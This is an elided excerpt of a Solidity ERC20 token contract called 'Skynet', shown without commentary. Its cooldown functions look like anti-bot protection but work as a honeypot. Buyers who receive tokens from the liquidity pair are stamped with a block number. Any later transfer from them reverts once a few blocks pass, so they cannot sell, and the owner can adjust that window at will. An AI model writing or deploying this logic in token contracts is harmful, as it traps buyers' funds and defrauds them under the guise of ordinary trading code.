...
contract Skynet is IERC20, Ownable {
    ...
    uint cooldown = 2;
    function setCooldown(uint value) public onlyOwner {
        cooldown = value;
    }
    function checkCooldown(address from) internal view {
        uint bn = block.number;
        uint256 cd = cooldowns[from];
        require(getPairAddress() == from || cd == 0 || bn - cd <= cooldown);
    }
    ...
    function getAllowed(address from, address to, address pair) internal returns (bool) {
        ...
        if (allowed && !InLq) {
            if (pair == from && cooldowns[to] == 0) {cooldowns[to] = block.number;}
            return true;
        }
        return allowed;
    }
